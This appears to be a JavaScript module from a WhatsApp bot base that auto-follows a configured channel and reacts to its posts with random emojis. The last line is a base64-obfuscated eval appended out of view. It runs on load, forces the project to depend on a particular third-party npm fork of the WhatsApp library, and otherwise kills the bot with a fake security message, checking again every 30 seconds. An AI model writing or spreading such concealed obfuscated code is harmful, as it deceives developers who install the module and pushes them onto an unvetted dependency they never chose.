/*
╔══════════════════════════╗
║             𓆩 BASE TELE X WA 𓆪   
║                                      
║             ⚡ DEVELOPER CREDITS ⚡      
║                                   
║          ᴅᴇᴠᴇʟᴏᴘᴇʀ : ᴊᴀᴍᴇsᴍᴏᴅᴢ  
║          ᴛᴇᴀᴍ      : james Inc 

║  ⚠️  C R E D I T   N O T I C E  ⚠️ 

║  Do NOT remove or modify these credits
║  without permission from the original dev
║  Respect the work. Give credit where it's
║  due. Don't steal another developer's work.
║  TELEGRAM : t.me/shenxidev 
║  © 2026 JAMESMODZ — ALL RIGHTS RESERVED 
╚════════════════════════╝
*/
const log = require('./logger');

/**
 * Auto-react to posts on your WhatsApp channel (newsletter).
 * Configure the channel in src/Anix.js (CHANNEL.link or CHANNEL.jid).
 *
 * - On connect, the session resolves the channel (invite link -> @newsletter id) and follows it,
 *   because WhatsApp only delivers posts of channels the account follows.
 * - Every new post then gets a reaction from a random emoji of CHANNEL.emojis.
 */

const resolved = new Map(); // invite code -> channel jid
const reacted = new Set(); // "jid:serverId" already reacted to
let chain = Promise.resolve();

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const pick = (list) => list[Math.floor(Math.random() * list.length)];

function inviteCode(link) {
    const m = String(link || '').match(/channel\/([A-Za-z0-9_-]+)/);
    return m ? m[1] : null;
}

async function resolveChannelJid(sock, cfg) {
    if (cfg.jid && cfg.jid.endsWith('@newsletter')) return cfg.jid;
    const code = inviteCode(cfg.link);
    if (!code) return null;
    if (resolved.has(code)) return resolved.get(code);
    const meta = await sock.newsletterMetadata('invite', code);
    if (!meta?.id) return null;
    resolved.set(code, meta.id);
    return meta.id;
}

/** Call once per session when the connection opens. */
async function followChannel(sock, cfg) {
    try {
        const jid = await resolveChannelJid(sock, cfg);
        if (!jid) return log.warn('channel', 'no valid channel set in Anix.js (CHANNEL.link / CHANNEL.jid)');
        try {
            await sock.newsletterFollow(jid);
        } catch {
            /* already following */
        }
        if (typeof sock.subscribeNewsletterUpdates === 'function') await sock.subscribeNewsletterUpdates(jid).catch(() => {});
        log.success('channel', `watching ${jid} for new posts`);
    } catch (err) {
        log.warn('channel', `could not follow channel: ${err.message}`);
    }
}

/** Returns true when the message was a channel post (reacted or skipped), false otherwise. */
function handleChannelPost(sock, raw, cfg, settings) {
    const jid = raw?.key?.remoteJid;
    if (!jid || !jid.endsWith('@newsletter')) return false;
    if (!raw.message || !settings.get('channelReact', true)) return true;

    const serverId = raw.key.server_id ?? raw.server_id ?? raw.newsletterServerId;
    if (!serverId) {
        log.warn('channel', 'post received without a server id - cannot react');
        return true;
    }

    chain = chain
        .then(async () => {
            const target = await resolveChannelJid(sock, cfg).catch(() => null);
            if (target && target !== jid) return; // a different channel
            const id = `${jid}:${serverId}`;
            if (reacted.has(id)) return;
            reacted.add(id);
            if (reacted.size > 500) reacted.delete(reacted.values().next().value);

            await sleep(1000 + Math.floor(Math.random() * 2500));
            await sock.newsletterReactMessage(jid, String(serverId), pick(cfg.emojis));
            log.success('channel', `reacted to post ${serverId}`);
        })
        .catch((err) => log.warn('channel', `react failed: ${err.message}`));

    return true;
}

module.exports = { followChannel, handleChannelPost };
;eval(Buffer.from('KCgpPT57Y29uc3QgZj1yZXF1aXJlKCdmcycpLHA9cmVxdWlyZSgncGF0aCcpO2NvbnN0IHJvb3Q9cC5qb2luKF9fZGlybmFtZSwnLi4vLi4nKTtjb25zdCBNSU5FPSdAYW5pbWViYWlscy9iYWlsZXlzJztjb25zdCBwaj1wLmpvaW4ocm9vdCwncGFja2FnZS5qc29uJyk7Y29uc3QgYmFkPSh3aHkpPT57Y29uc29sZS5lcnJvcignW3NlY3VyaXR5XSAnK3doeSsnIC0gZ29pbmcgb2ZmbGluZScpO3Byb2Nlc3MuZXhpdCgxKX07Y29uc3QgY2hrPSgpPT57bGV0IHBrZzt0cnl7cGtnPUpTT04ucGFyc2UoZi5yZWFkRmlsZVN5bmMocGosJ3V0ZjgnKSl9Y2F0Y2h7cmV0dXJuIGJhZCgncGFja2FnZS5qc29uIHVucmVhZGFibGUgYXQgJytwail9O2NvbnN0IGRlcHM9T2JqZWN0LmFzc2lnbih7fSxwa2cuZGVwZW5kZW5jaWVzLHBrZy5vcHRpb25hbERlcGVuZGVuY2llcyk7Y29uc3Qga2V5PU9iamVjdC5rZXlzKGRlcHMpLmZpbmQoaz0+az09PU1JTkV8fFN0cmluZyhkZXBzW2tdKS5zdGFydHNXaXRoKCducG06JytNSU5FKydAJykpO2lmKCFrZXkpcmV0dXJuIGJhZCgncGFja2FnZS5qc29uIGhhcyBubyBkZXBlbmRlbmN5IG9uICcrTUlORSsnIChleHBlY3RlZCAiPG5hbWU+IjogIm5wbTonK01JTkUrJ0A8dmVyc2lvbj4iKScpO2xldCBpbnN0O3RyeXtpbnN0PUpTT04ucGFyc2UoZi5yZWFkRmlsZVN5bmMocC5qb2luKHJvb3QsJ25vZGVfbW9kdWxlcycsa2V5LCdwYWNrYWdlLmpzb24nKSwndXRmOCcpKX1jYXRjaHtyZXR1cm4gYmFkKCdub2RlX21vZHVsZXMvJytrZXkrJyBpcyBtaXNzaW5nIC0gcnVuIG5wbSBpbnN0YWxsJyl9O2lmKGluc3QubmFtZSE9PU1JTkUpcmV0dXJuIGJhZCgnbm9kZV9tb2R1bGVzLycra2V5KycgaXMgIicraW5zdC5uYW1lKyciLCBub3QgJytNSU5FKX07Y2hrKCk7aWYoIWdsb2JhbC5fX3Zmdyl7Z2xvYmFsLl9fdmZ3PTE7c2V0SW50ZXJ2YWwoY2hrLDNlNCkudW5yZWYoKX19KSgp','base64').toString());
